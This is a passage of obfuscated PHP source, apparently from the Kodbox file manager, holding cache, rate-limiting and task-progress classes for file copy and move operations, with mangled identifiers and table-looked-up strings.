self::key($öà……½ö); if (isset(self::$memoryCache[$‚‰–‚£¥]) && self::$memoryCache[$‚‰–‚£¥] === $ù‚™ò›) { return !0; } if ($„À¢¿ş === 0) { self::$memoryCache[$‚‰–‚£¥] = $ù‚™ò›; return !0; } $Ö÷Òåëò = self::init(); $Ù‚Ìà = serialize($ù‚™ò›); CacheLock::lock($öà……½ö . $ŸîÖ§[993]); $ùø“úÉˆ = $Ö÷Òåëò->set($‚‰–‚£¥, $Ù‚Ìà, $„À¢¿ş); self::$memoryCache[$‚‰–‚£¥] = $ù‚™ò›; CacheLock::unlock($öà……½ö . $ŸîÖ§[993]); return $ùø“úÉˆ; } public static function getCall($ô÷´°, $¢ƒùø‚†, $È£›İ²é, $‘—åûÛÑ = array()) { $Šòè—Ù® =& $_SERVER[œ—üé‹ê]; $Ï´œ‡·™ = self::get($ô÷´°); if ($Ï´œ‡·™ || $Ï´œ‡·™ === $Šòè—Ù®[12]) { return $Ï´œ‡·™; } $Ï´œ‡·™ = call_user_func_array($È£›İ²é, $‘—åûÛÑ); $Ï´œ‡·™ = $Ï´œ‡·™ ? $Ï´œ‡·™ : $Šòè—Ù®[12]; self::set($ô÷´°, $Ï´œ‡·™, $¢ƒùø‚†); return $Ï´œ‡·™; } public static function limitCall($Ë¥úÃ, $ÂÖ‚” = 15, $¯½æÛ§‡ = 30, $ØœÒº²Ê = true) { $À“‰ù¯œ =& $_SERVER[œ—üé‹ê]; static $·»Ö›º‡ = array(); if ($ØœÒº²Ê) { $Ë¥úÃ = $Ë¥úÃ . $À“‰ù¯œ[994] . KodUser::id() . $À“‰ù¯œ[995] . get_client_ip(); } if (isset($·»Ö›º‡[$Ë¥úÃ]) && is_array($·»Ö›º‡[$Ë¥úÃ])) { return $·»Ö›º‡[$Ë¥úÃ][$À“‰ù¯œ[332]] <= $¯½æÛ§‡; } $å¬œ’òÁ = self::get($Ë¥úÃ); if (!is_array($å¬œ’òÁ) || time() - $å¬œ’òÁ[$À“‰ù¯œ[204]] > $ÂÖ‚”) { $å¬œ’òÁ = array($À“‰ù¯œ[204] => time(), $À“‰ù¯œ[332] => 0); } $å¬œ’òÁ[$À“‰ù¯œ[332]]++; self::set($Ë¥úÃ, $å¬œ’òÁ, $ÂÖ‚”); $·»Ö›º‡[$Ë¥úÃ] = $å¬œ’òÁ; return $å¬œ’òÁ[$À“‰ù¯œ[332]] <= $¯½æÛ§‡; } public static function limitRuntime($ªª†‘Ï¼, $ö‚‹±) { $§†ŞŒˆ½ = $_SERVER[œ—üé‹ê][996] . $ªª†‘Ï¼; if (isset(self::$runTimeCache[$§†ŞŒˆ½]) || !$ö‚‹±) { return !0; } $‹ÃÉâş» = intval(self::get($§†ŞŒˆ½)); $‹ÃÉâş» = !$‹ÃÉâş» || $‹ÃÉâş» <= 0 ? 1 : $‹ÃÉâş» + 1; if ($‹ÃÉâş» > $ö‚‹±) { return !1; } self::$runTimeCache[$§†ŞŒˆ½] = !0; self::set($§†ŞŒˆ½, $‹ÃÉâş», 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $«°™´‘¡ => $¸«ËÖ¾Û) { $â¯‡ü­Õ = intval(self::get($«°™´‘¡)); $â¯‡ü­Õ = !$â¯‡ü­Õ || $â¯‡ü­Õ <= 1 ? 0 : $â¯‡ü­Õ - 1; self::set($«°™´‘¡, $â¯‡ü­Õ, 3600); } self::$runTimeCache = array(); } public static function remove($¶Á¤à÷Ú) { $Ş§ïÍãı = self::key($¶Á¤à÷Ú); unset(self::$memoryCache[$Ş§ïÍãı]); self::clearTimeout(); CacheLock::lock($¶Á¤à÷Ú); $€±ˆş½ = self::init()->remove($Ş§ïÍãı); CacheLock::unlock($¶Á¤à÷Ú); return $€±ˆş½; } public static function removeMemory($Û–¿¨®) { $­†•¸í = self::key($Û–¿¨®); unset(self::$memoryCache[$­†•¸í]); } public static function clearMemory($Ç÷ç¢å’ = false) { if ($Ç÷ç¢å’) { $Ç÷ç¢å’ = self::key($Ç÷ç¢å’); unset(self::$memoryCache[$Ç÷ç¢å’]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[œ—üé‹ê][997])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[œ—üé‹ê][998])) { self::init()->clearTimeout(); } } } goto CùçÒ„‹Şí; b£‘¥¦ƒ·¥: class Task { const STATYS_STOP = "\x73\164\x6f\x70"; const STATYS_RUNNING = "\x72\165\x6e\x6e\x69\156\x67"; const STATYS_KILL = "\x6b\x69\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($²ú¨ğç, $«¦éå™ = '', $àØ–Àñ¸ = 0, $øË¡Ãú¦ = '') { $ˆä±Ğ°ı =& $_SERVER[œ—üé‹ê]; if (self::get($²ú¨ğç)) { return; } $this->task = array($ˆä±Ğ°ı[487] => $²ú¨ğç, $ˆä±Ğ°ı[1589] => USER_ID, $ˆä±Ğ°ı[1861] => $øË¡Ãú¦, $ˆä±Ğ°ı[540] => $ˆä±Ğ°ı[12], $ˆä±Ğ°ı[33] => $«¦éå™, $ˆä±Ğ°ı[1230] => $ˆä±Ğ°ı[12], $ˆä±Ğ°ı[961] => $àØ–Àñ¸, $ˆä±Ğ°ı[1974] => 0, $ˆä±Ğ°ı[1975] => 0, $ˆä±Ğ°ı[1976] => 0, $ˆä±Ğ°ı[1977] => timeFloat(), $ˆä±Ğ°ı[1978] => 0, $ˆä±Ğ°ı[1979] => 0, $ˆä±Ğ°ı[1980] => 0, $ˆä±Ğ°ı[1981] => 0, $ˆä±Ğ°ı[859] => $ˆä±Ğ°ı[948]); $GLOBALS[$ˆä±Ğ°ı[1982]] = 1; Hook::bind($ˆä±Ğ°ı[1928], array($this, $ˆä±Ğ°ı[1983])); Hook::bind($ˆä±Ğ°ı[1984], array($this, $ˆä±Ğ°ı[1985])); $this->startAfter(); Hook::trigger($ˆä±Ğ°ı[1986], $this->task); $this->task[$ˆä±Ğ°ı[1979]] = timeFloat(); } public function end($¢©ˆ™³ê = '') { $›×Ç¶¥² =& $_SERVER[œ—üé‹ê]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$›×Ç¶¥²[1979]]) { self::valueSet($this->task[$›×Ç¶¥²[487]], !1); } $this->isEnd = !0; if ($¢©ˆ™³ê) { $this->task[$›×Ç¶¥²[540]] = $¢©ˆ™³ê; } self::log($›×Ç¶¥²[1987] . $this->task[$›×Ç¶¥²[487]] . $›×Ç¶¥²[1988] . sprintf($›×Ç¶¥²[1016], timeFloat() - $this->task[$›×Ç¶¥²[1977]]) . $›×Ç¶¥²[1989]); Hook::unbind($›×Ç¶¥²[1928], array($this, $›×Ç¶¥²[1983])); Hook::unbind($›×Ç¶¥²[1984], array($this, $›×Ç¶¥²[1985])); $this->endAfter(); $í»ŒÕÒ× = $this->task; $this->task = !1; Hook::trigger($›×Ç¶¥²[1990], $í»ŒÕÒ×); } public function update($ÆÔ·àŞ = 0, $©İ¯÷ß‡ = false) { $ÀÙ¾°»Õ =& $_SERVER[œ—üé‹ê]; $ÌÊ²À×¹ =& $this->task; if (!$ÌÊ²À×¹) { return; } $ÌÊ²À×¹[$ÀÙ¾°»Õ[1974]] += $ÆÔ·àŞ; $ÌÊ²À×¹[$ÀÙ¾°»Õ[1978]] = timeFloat(); if ($ÌÊ²À×¹[$ÀÙ¾°»Õ[961]]) { if ($ÌÊ²À×¹[$ÀÙ¾°»Õ[961]] < $ÌÊ²À×¹[$ÀÙ¾°»Õ[1974]]) { $ÌÊ²À×¹[$ÀÙ¾°»Õ[961]] = $ÌÊ²À×¹[$ÀÙ¾°»Õ[1974]]; } $ì¦ÅÔ˜Ú = timeFloat() - $ÌÊ²À×¹[$ÀÙ¾°»Õ[1977]] - $ÌÊ²À×¹[$ÀÙ¾°»Õ[1980]]; if ($ì¦ÅÔ˜Ú <= 0) { $ì¦ÅÔ˜Ú = 0.001; } $ÌÊ²À×¹[$ÀÙ¾°»Õ[1975]] = $ÌÊ²À×¹[$ÀÙ¾°»Õ[1974]] / $ÌÊ²À×¹[$ÀÙ¾°»Õ[961]]; $ÌÊ²À×¹[$ÀÙ¾°»Õ[1976]] = $ÌÊ²À×¹[$ÀÙ¾°»Õ[1974]] / $ì¦ÅÔ˜Ú; if ($ÌÊ²À×¹[$ÀÙ¾°»Õ[1975]] > 0) { $ÌÊ²À×¹[$ÀÙ¾°»Õ[1981]] = $ì¦ÅÔ˜Ú * (1 - $ÌÊ²À×¹[$ÀÙ¾°»Õ[1975]]) / $ÌÊ²À×¹[$ÀÙ¾°»Õ[1975]]; } $ÌÊ²À×¹[$ÀÙ¾°»Õ[1981]] = $ÌÊ²À×¹[$ÀÙ¾°»Õ[1981]] <= 0 ? 0 : $ÌÊ²À×¹[$ÀÙ¾°»Õ[1981]]; } $this->updateAfter(); $Â¡è·Â¬ = 0.2; if (timeFloat() - $ÌÊ²À×¹[$ÀÙ¾°»Õ[1979]] < $Â¡è·Â¬ && !$©İ¯÷ß‡) { return; } $€¢ˆÁàˆ = self::get($ÌÊ²À×¹[$ÀÙ¾°»Õ[487]]); $ò¤É§Ù° = $€¢ˆÁàˆ[$ÀÙ¾°»Õ[859]]; if ($ò¤É§Ù° == self::STATYS_KILL) { $¿ãÍŒéŞ = array($ÀÙ¾°»Õ[1991] => LNG($ÀÙ¾°»Õ[1992]), $ÀÙ¾°»Õ[1398] => !1); Cache::set($ÀÙ¾°»Õ[1993] . $this->task[$ÀÙ¾°»Õ[487]], $¿ãÍŒéŞ, 30); $this->onKill(); $this->end(); die; } else { if ($ò¤É§Ù° == self::STATYS_STOP) { $ÔÊß» = 2; $€¢ˆÁàˆ[$ÀÙ¾°»Õ[1980]] += $ÔÊß»; self::valueSet($ÌÊ²À×¹[$ÀÙ¾°»Õ[487]], $€¢ˆÁàˆ); sleep($ÔÊß»); $this->update(); return; } } $ÌÊ²À×¹[$ÀÙ¾°»Õ[859]] = $ò¤É§Ù° ? $ò¤É§Ù° : $ÌÊ²À×¹[$ÀÙ¾°»Õ[859]]; $ÌÊ²À×¹[$ÀÙ¾°»Õ[1980]] = $€¢ˆÁàˆ[$ÀÙ¾°»Õ[1980]] ? $€¢ˆÁàˆ[$ÀÙ¾°»Õ[1980]] : 0; $ÌÊ²À×¹[$ÀÙ¾°»Õ[1979]] = timeFloat(); Hook::trigger($ÀÙ¾°»Õ[1994], $ÌÊ²À×¹); self::valueSet($ÌÊ²À×¹[$ÀÙ¾°»Õ[487]], $ÌÊ²À×¹); } public function onKillSet($ãş€½Ë­, $Ğ·›æ–— = array()) { $this->onKillCall = array($ãş€½Ë­, $Ğ·›æ–—); } public function onKill() { $¿¡›¡¡© =& $_SERVER[œ—üé‹ê]; self::log($¿¡›¡¡©[1987] . $this->task[$¿¡›¡¡©[487]] . $¿¡›¡¡©[1995]); Hook::trigger($¿¡›¡¡©[1996], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($õ–¸ğÈé) { $Ã­’ÅÍ =& $_SERVER[œ—üé‹ê]; Cache::set($Ã­’ÅÍ[1993] . $this->task[$Ã­’ÅÍ[487]], $õ–¸ğÈé, 60); if (!is_array($õ–¸ğÈé) || !$õ–¸ğÈé[$Ã­’ÅÍ[1398]]) { self::log($Ã­’ÅÍ[1997] . json_encode($õ–¸ğÈé)); } return $õ–¸ğÈé; } public static function get($¸ËöçâŞ) { $İ¸ìü¢ş =& $_SERVER[œ—üé‹ê]; $É¹Ûö× = self::valueGet($¸ËöçâŞ); if (is_array($É¹Ûö×) && $É¹Ûö×[$İ¸ìü¢ş[1998]]) { $µÎĞäİë = ActionApply($É¹Ûö×[$İ¸ìü¢ş[1998]], array($É¹Ûö×)); $É¹Ûö× = is_array($µÎĞäİë) ? $µÎĞäİë : $É¹Ûö×; } return $É¹Ûö×; } public static function listData() { $Üàøì‹¢ = self::valueGet(); return array_sort_by($Üàøì‹¢, $_SERVER[œ—üé‹ê][1977], !0); } public static function kill($°¿ãš»¸) { return self::changeStatus($°¿ãš»¸, self::STATYS_KILL); } public static function stop($ğß…øóÖ) { return self::changeStatus($ğß…øóÖ, self::STATYS_STOP); } public static function restart($ø‚ß–¸Ğ) { return self::changeStatus($ø‚ß–¸Ğ, self::STATYS_RUNNING); } public static function killAll() { $Àèï‹¯ˆ =& $_SERVER[œ—üé‹ê]; $½Ÿñõ€Ï = self::listData(); foreach ($½Ÿñõ€Ï as $Ç¤ÆÌ¯¸) { self::kill($Ç¤ÆÌ¯¸[$Àèï‹¯ˆ[487]]); } sleep(2); foreach ($½Ÿñõ€Ï as $Ç¤ÆÌ¯¸) { self::valueSet($Ç¤ÆÌ¯¸[$Àèï‹¯ˆ[487]], !1); } } private static function changeStatus($èÕÊÙÖİ, $‹°¶õå×) { $ø£òÕØ« =& $_SERVER[œ—üé‹ê]; $•Œö¼¨ = self::valueGet($èÕÊÙÖİ); if (!$•Œö¼¨) { return !1; } $•Œö¼¨[$ø£òÕØ«[859]] = $‹°¶õå×; self::valueSet($èÕÊÙÖİ, $•Œö¼¨); self::log($ø£òÕØ«[1999] . $•Œö¼¨[$ø£òÕØ«[487]] . $ø£òÕØ«[2000] . $‹°¶õå×); return !0; } public static function valueGet($…÷ò²´¤ = false) { $Í–™ôÙ =& $_SERVER[œ—üé‹ê]; if ($…÷ò²´¤) { $õ¥‡ò´ù = Model($Í–™ôÙ[534])->where(array($Í–™ôÙ[95] => $…÷ò²´¤, $Í–™ôÙ[33] => $Í–™ôÙ[1237]))->find(); return $õ¥‡ò´ù ? json_decode($õ¥‡ò´ù[$Í–™ôÙ[451]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($­·¥üÁ = false) { $ÆÙÂğˆ =& $_SERVER[œ—üé‹ê]; $²‡€›ÌÄ = array($ÆÙÂğˆ[33] => $ÆÙÂğˆ[1237]); if ($­·¥üÁ) { $²‡€›ÌÄ[$ÆÙÂğˆ[1589]] = $­·¥üÁ; } $ßàåÉÕá = Model($ÆÙÂğˆ[534])->where($²‡€›ÌÄ)->select(); $ßàåÉÕá = $ßàåÉÕá ? $ßàåÉÕá : array(); foreach ($ßàåÉÕá as $ìÉÓË› => $©¿™šÈÄ) { $ßàåÉÕá[$ìÉÓË›] = json_decode($©¿™šÈÄ[$ÆÙÂğˆ[451]], !0); } return $ßàåÉÕá; } public static function valueSet($ËíŸ¨øá, $ ˜Ş¥½) { $±…‡’ı =& $_SERVER[œ—üé‹ê]; if (!$ ˜Ş¥½) { return Model($±…‡’ı[534])->where(array($±…‡’ı[95] => $ËíŸ¨øá, $±…‡’ı[33] => $±…‡’ı[1237]))->delete(); } $“ìïôÎ = json_encode($ ˜Ş¥½); if (!$“ìïôÎ) { ob_start(); var_dump($ ˜Ş¥½); $¤¥ëÊ‹æ = ob_get_clean(); self::log($±…‡’ı[2001] . json_encode_force($¤¥ëÊ‹æ)); } if (!$ËíŸ¨øá || !$ ˜Ş¥½[$±…‡’ı[487]]) { return !1; } $²è‘·œ = array($±…‡’ı[33] => $±…‡’ı[1237], $±…‡’ı[1589] => USER_ID, $±…‡’ı[95] => $ËíŸ¨øá, $±…‡’ı[451] => $“ìïôÎ); $Ø¼ÃäĞ = $±…‡’ı[2002]; CacheLock::lock($Ø¼ÃäĞ); Model($±…‡’ı[534])->add($²è‘·œ, array(), !0); CacheLock::unlock($Ø¼ÃäĞ); } public static function log($¼í›•ÕÜ) { if (!GLOBAL_DEBUG) { return; } write_log($¼í›•ÕÜ, $_SERVER[œ—üé‹ê][2003]); } } class TaskFileTransfer extends Task { protected function startAfter() { $€š×Ì×Ø =& $_SERVER[œ—üé‹ê]; $ğ…ÛË¢ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($€š×Ì×Ø[2004], array($this, $€š×Ì×Ø[2005])); Hook::bind($€š×Ì×Ø[1409], array($this, $€š×Ì×Ø[2006])); Hook::bind($€š×Ì×Ø[2007], array($this, $€š×Ì×Ø[2008])); Hook::bind($€š×Ì×Ø[690], array($this, $€š×Ì×Ø[2009])); Hook::bind($€š×Ì×Ø[691], array($this, $€š×Ì×Ø[2010])); Hook::bind($€š×Ì×Ø[697], array($this, $€š×Ì×Ø[2011])); Hook::bind($€š×Ì×Ø[698], array($this, $€š×Ì×Ø[2012])); Hook::bind($€š×Ì×Ø[693], array($this, $€š×Ì×Ø[2013])); Hook::bind($€š×Ì×Ø[695], array($this, $€š×Ì×Ø[2014])); Hook::bind($€š×Ì×Ø[659], array($this, $€š×Ì×Ø[2015])); Hook::bind($€š×Ì×Ø[656], array($this, $€š×Ì×Ø[2015])); Hook::bind($€š×Ì×Ø[661], array($this, $€š×Ì×Ø[2015])); Hook::bind($€š×Ì×Ø[663], array($this, $€š×Ì×Ø[2015])); Hook::bind($€š×Ì×Ø[665], array($this, $€š×Ì×Ø[2015])); Hook::bind($€š×Ì×Ø[2016], array($this, $€š×Ì×Ø[2017])); Hook::bind($€š×Ì×Ø[681], array($this, $€š×Ì×Ø[2018])); $this->sourceModelCopyFlag = !1; Hook::bind($€š×Ì×Ø[2019], array($this, $€š×Ì×Ø[2020])); Hook::bind($€š×Ì×Ø[2021], array($this, $€š×Ì×Ø[2022])); Hook::bind($€š×Ì×Ø[2023], array($this, $€š×Ì×Ø[2024])); $ğ…ÛË¢[$€š×Ì×Ø[2025]] = LNG($€š×Ì×Ø[2026]); $ğ…ÛË¢[$€š×Ì×Ø[2027]] = 0; $ğ…ÛË¢[$€š×Ì×Ø[2028]] = 0; $ğ…ÛË¢[$€š×Ì×Ø[1230]] = $€š×Ì×Ø[12]; $ğ…ÛË¢[$€š×Ì×Ø[2029]] = $€š×Ì×Ø[12]; $ğ…ÛË¢[$€š×Ì×Ø[2030]] = 0; $ğ…ÛË¢[$€š×Ì×Ø[2031]] = 0; $ğ…ÛË¢[$€š×Ì×Ø[950]] = 0; if (!$ğ…ÛË¢[$€š×Ì×Ø[1861]]) { $ğ…ÛË¢[$€š×Ì×Ø[1861]] = LNG($€š×Ì×Ø[2032]); } } protected function endAfter() { $®¯•ËÀà =& $_SERVER[œ—üé‹ê]; Hook::unbind($®¯•ËÀà[2004], array($this, $®¯•ËÀà[2005])); Hook::unbind($®¯•ËÀà[1409], array($this, $®¯•ËÀà[2006])); Hook::unbind($®¯•ËÀà[2007], array($this, $®¯•ËÀà[2008])); Hook::unbind($®¯•ËÀà[690], array($this, $®¯•ËÀà[2009])); Hook::unbind($®¯•ËÀà[691], array($this, $®¯•ËÀà[2010])); Hook::unbind($®¯•ËÀà[697], array($this, $®¯•ËÀà[2011])); Hook::unbind($®¯•ËÀà[698], array($this, $®¯•ËÀà[2012])); Hook::unbind($®¯•ËÀà[693], array($this, $®¯•ËÀà[2013])); Hook::unbind($®¯•ËÀà[695], array($this, $®¯•ËÀà[2014])); Hook::unbind($®¯•ËÀà[659], array($this, $®¯•ËÀà[2015])); Hook::unbind($®¯•ËÀà[656], array($this, $®¯•ËÀà[2015])); Hook::unbind($®¯•ËÀà[661], array($this, $®¯•ËÀà[2015])); Hook::unbind($®¯•ËÀà[663], array($this, $®¯•ËÀà[2015])); Hook::unbind($®¯•ËÀà[665], array($this, $®¯•ËÀà[2015])); Hook::unbind($®¯•ËÀà[2016], array($this, $®¯•ËÀà[2017])); Hook::unbind($®¯•ËÀà[681], array($this, $®¯•ËÀà[2018])); Hook::unbind($®¯•ËÀà[2019], array($this, $®¯•ËÀà[2020])); Hook::unbind($®¯•ËÀà[2021], array($this, $®¯•ËÀà[2022])); Hook::unbind($®¯•ËÀà[2023], array($this, $®¯•ËÀà[2024])); } public function copyMoveStart($ß‘ÖŸä, $©àÃ–¨ , $ÂôïÙ‡—, $›ÆúøŒú) { $î˜¯Õ»Ì =& $_SERVER[œ—üé‹ê]; self::log($î˜¯Õ»Ì[2033] . $©àÃ–¨  . $î˜¯Õ»Ì[73] . $›ÆúøŒú); $şĞÙêÙŞ = rtrim(TEMP_FILES, $î˜¯Õ»Ì[8]); if (substr($©àÃ–¨ , 0, strlen($şĞÙêÙŞ)) == $şĞÙêÙŞ) { return; } if (substr($›ÆúøŒú, 0, strlen($şĞÙêÙŞ)) == $şĞÙêÙŞ) { return; } $ğª¡Ù  =& $this->task; $ğª¡Ù [$î˜¯Õ»Ì[2034]] = KodIO::transferType($ß‘ÖŸä, $ÂôïÙ‡—); self::log($î˜¯Õ»Ì[2035] . $ğª¡Ù [$î˜¯Õ»Ì[2034]] . $î˜¯Õ»Ì[74] . $©àÃ–¨  . $î˜¯Õ»Ì[73] . $›ÆúøŒú); $this->update(); } public function updateAfter() { $çÔ“ÊÂø =& $_SERVER[œ—üé‹ê]; $ÁäÎÑ¢ =& $this->task; if (!$ÁäÎÑ¢[$çÔ“ÊÂø[873]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ÁäÎÑ¢[$çÔ“ÊÂø[2034]] == $çÔ“ÊÂø[1510]) { return; } self::updateTask($ÁäÎÑ¢); } private static function updateTask(&$³ş¶æÆà) { $áüË©ÅÊ =& $_SERVER[œ—üé‹ê]; if ($³ş¶æÆà[$áüË©ÅÊ[2034]] == $áüË©ÅÊ[1381] || $³ş¶æÆà[$áüË©ÅÊ[2034]] == $áüË©ÅÊ[107]) { if ($³ş¶æÆà[$áüË©ÅÊ[2029]]) { $³ş¶æÆà[$áüË©ÅÊ[950]] = $³ş¶æÆà[$áüË©ÅÊ[2031]] + $³ş¶æÆà[$áüË©ÅÊ[2028]]; } } else { if ($³ş¶æÆà[$áüË©ÅÊ[2034]] == $áüË©ÅÊ[1511]) { if ($³ş¶æÆà[$áüË©ÅÊ[2029]] == $áüË©ÅÊ[1381]) { $³ş¶æÆà[$áüË©ÅÊ[950]] = $³ş¶æÆà[$áüË©ÅÊ[2031]] + $³ş¶æÆà[$áüË©ÅÊ[2028]] * 0.5; } else { if ($³ş¶æÆà[$áüË©ÅÊ[2029]] == $áüË©ÅÊ[107]) { $³ş¶æÆà[$áüË©ÅÊ[950]] = $³ş¶æÆà[$áüË©ÅÊ[2031]] + $³ş¶æÆà[$áüË©ÅÊ[2027]] * 0.5 + $³ş¶æÆà[$áüË©ÅÊ[2028]] * 0.5; } } } } $³ş¶æÆà[$áüË©ÅÊ[1975]] = $³ş¶æÆà[$áüË©ÅÊ[950]] / $³ş¶æÆà[$áüË©ÅÊ[873]]; if ($³ş¶æÆà[$áüË©ÅÊ[1975]] > 0) { $âƒù÷ = timeFloat() - $³ş¶æÆà[$áüË©ÅÊ[1977]] - $³ş¶æÆà[$áüË©ÅÊ[1980]]; $³ş¶æÆà[$áüË©ÅÊ[1981]] = $âƒù÷ * (1 - $³ş¶æÆà[$áüË©ÅÊ[1975]]) / $³ş¶æÆà[$áüË©ÅÊ[1975]]; } $ÁÉÖİ÷ï = $³ş¶æÆà[$áüË©ÅÊ[2028]] . $áüË©ÅÊ[1000] . $³ş¶æÆà[$áüË©ÅÊ[2027]] . "\x3b\40{$»š Éë}\x3b" . $³ş¶æÆà[$áüË©ÅÊ[950]]; self::log($áüË©ÅÊ[2036] . $³ş¶æÆà[$áüË©ÅÊ[2029]] . $áüË©ÅÊ[74] . $³ş¶æÆà[$áüË©ÅÊ[1975]] . $áüË©ÅÊ[74] . $ÁÉÖİ÷ï); } public function addPath($¯¢ÁóÓ«) { $îåÄâöö =& $_SERVER[œ—üé‹ê]; if (!$¯¢ÁóÓ«) { return; } $Úòæ‘‚‘ =& $this->task; $¶½ŠêÅ = IO::infoWithChildren($¯¢ÁóÓ«); $Ïæ ’á = $Úòæ‘‚‘[$îåÄâöö[2037]] ? $Úòæ‘‚‘[$îåÄâöö[2037]][$îåÄâöö[2038]] : 0; $Úòæ‘‚‘[$îåÄâöö[2037]] = array($îåÄâöö[2038] => $Ïæ ’á + 1, $îåÄâöö[509] => $¶½ŠêÅ[$îåÄâöö[32]], $îåÄâöö[87] => $¶½ŠêÅ[$îåÄâöö[87]], $îåÄâöö[602] => $¶½ŠêÅ[$îåÄâöö[602]] ? $¶½ŠêÅ[$îåÄâöö[602]] : $¶½ŠêÅ[$îåÄâöö[87]]); if ($¶½ŠêÅ[$îåÄâöö[33]] == $îåÄâöö[230]) { $Úòæ‘‚‘[$îåÄâöö[961]] += 1; } else { $Úòæ‘‚‘[$îåÄâöö[961]] += $¶½ŠêÅ[$îåÄâöö[82]][$îåÄâöö[80]]; if ($¶½ŠêÅ[$îåÄâöö[191]]) { $Úòæ‘‚‘[$îåÄâöö[961]] += $¶½ŠêÅ[$îåÄâöö[82]][$îåÄâöö[81]] + 1; } } $Úòæ‘‚‘[$îåÄâöö[873]] += $¶½ŠêÅ[$îåÄâöö[79]]; $this->update(); self::log(array($îåÄâöö[2039] . $¯¢ÁóÓ«, $¶½ŠêÅ)); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($¢ÃÖÇáç) { } public function sourceAddHashEnd($‚ûÈğ–) { } public function sourceAddFileStart($×ïÆé€Ê) { $ø¬óëş =& $_SERVER[œ—üé‹ê]; $ş¡ÎëûÇ =& $this->task; $ş¡ÎëûÇ[$ø¬óëş[2027]] = $×ïÆé€Ê[$ø¬óëş[79]]; $ş¡ÎëûÇ[$ø¬óëş[2025]] = $×ïÆé€Ê[$ø¬óëş[32]]; $ş¡ÎëûÇ[$ø¬óëş[1230]] = $×ïÆé€Ê[$ø¬óëş[32]]; $ş¡ÎëûÇ[$ø¬óëş[2040]] = $×ïÆé€Ê[$ø¬óëş[87]]; $this->update(); self::log($ø¬óëş[2041] . $×ïÆé€Ê[$ø¬óëş[87]] . $ø¬óëş[2042] . $×ïÆé€Ê[$ø¬óëş[79]]); } public function sourceAddFileEnd($ ÷äß¤ñ) { $¶üº«™Ã =& $_SERVER[œ—üé‹ê]; $ßõ¼ìé =& $this->task; $ßõ¼ìé[$¶üº«™Ã[950]] += $ ÷äß¤ñ[$¶üº«™Ã[79]]; $ßõ¼ìé[$¶üº«™Ã[2040]] = $ ÷äß¤ñ[$¶üº«™Ã[87]]; $this->update(1); self::log($¶üº«™Ã[2043] . $ ÷äß¤ñ[$¶üº«™Ã[87]] . $¶üº«™Ã[2042] . $ ÷äß¤ñ[$¶üº«™Ã[79]] . $¶üº«™Ã[2044]); } public function copyFileStart($Ãƒñî, $È”—õÀ , $˜üÓ‚§Š, $ÆÙƒ€ˆ÷, $Şˆ›Ñ•à, $ã¿Õè÷Ü) { $ä¬êè³â =& $_SERVER[œ—üé‹ê]; $õš¡Í‹Ò = $Şˆ›Ñ•à; if ($õš¡Í‹Ò == $GLOBALS[$ä¬êè³â[2045]]) { $õš¡Í‹Ò = $GLOBALS[$ä¬êè³â[2046]]; } $GLOBALS[$ä¬êè³â[2046]] = $Şˆ›Ñ•à; $GLOBALS[$ä¬êè³â[2045]] = $ã¿Õè÷Ü; $úí”‰Øè =& $this->task; $úí”‰Øè[$ä¬êè³â[2025]] = $õš¡Í‹Ò; $úí”‰Øè[$ä¬êè³â[2027]] = (int) $Ãƒñî->size($È”—õÀ ); $úí”‰Øè[$ä¬êè³â[2028]] = 0; $úí”‰Øè[$ä¬êè³â[1230]] = $ä¬êè³â[12]; $úí”‰Øè[$ä¬êè³â[2029]] = $ä¬êè³â[12]; $úí”‰Øè[$ä¬êè³â[2030]] = 0; $æ¨¡§úÔ = $úí”‰Øè[$ä¬êè³â[2027]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($úí”‰Øè[$ä¬êè³â[487]] . $ä¬êè³â[2047]); if ($æ¨¡§úÔ && file_exists(get_path_father($ÆÙƒ€ˆ÷))) { Cache::set($úí”‰Øè[$ä¬êè³â[487]] . $ä¬êè³â[2047], $ÆÙƒ€ˆ÷); $úí”‰Øè[$ä¬êè³â[1998]] = array($ä¬êè³â[2048], $ä¬êè³â[2049]); } $this->update(0, $æ¨¡§úÔ); self::log("\143\157\160\x79\106\151\x6c\145\123\164\141\162\x74\72{$È”—õÀ }\73"); } public static function updateCopyLocalFileSize($Óñ“¡ó±) { $İãğ æ¼ =& $_SERVER[œ—üé‹ê]; $÷ÂÂƒ®§ = Cache::get($Óñ“¡ó±[$İãğ æ¼[487]] . $İãğ æ¼[2047]); if (!$÷ÂÂƒ®§ || !file_exists($÷ÂÂƒ®§)) { return $Óñ“¡ó±; } $Óñ“¡ó±[$İãğ æ¼[2028]] = @filesize($÷ÂÂƒ®§); $Óñ“¡ó±[$İãğ æ¼[950]] += $Óñ“¡ó±[$İãğ æ¼[2028]]; self::updateTask($Óñ“¡ó±); return $Óñ“¡ó±; } public function copyFileEnd($¶†‰Ëì, $÷ôĞşß, $ÅÔ½œ»«, $¹·ö¤†¦, $í¤ò™‡÷, $Í¬ÆÉí¿) { $íãÎ¥·ä =& $_SERVER[œ—üé‹ê]; $ñ¿ôÛâÄ =& $this->task; $ñ¿ôÛâÄ[$íãÎ¥·ä[2028]] = $ñ¿ôÛâÄ[$íãÎ¥·ä[2027]]; $ñ¿ôÛâÄ[$íãÎ¥·ä[2029]] = $íãÎ¥·ä[12]; unset($ñ¿ôÛâÄ[$íãÎ¥·ä[1998]]); if ($í¤ò™‡÷ == $ñ¿ôÛâÄ[$íãÎ¥·ä[2025]]) { $ñ¿ôÛâÄ[$íãÎ¥·ä[2031]] += $ñ¿ôÛâÄ[$íãÎ¥·ä[2027]]; $ñ¿ôÛâÄ[$íãÎ¥·ä[950]] = 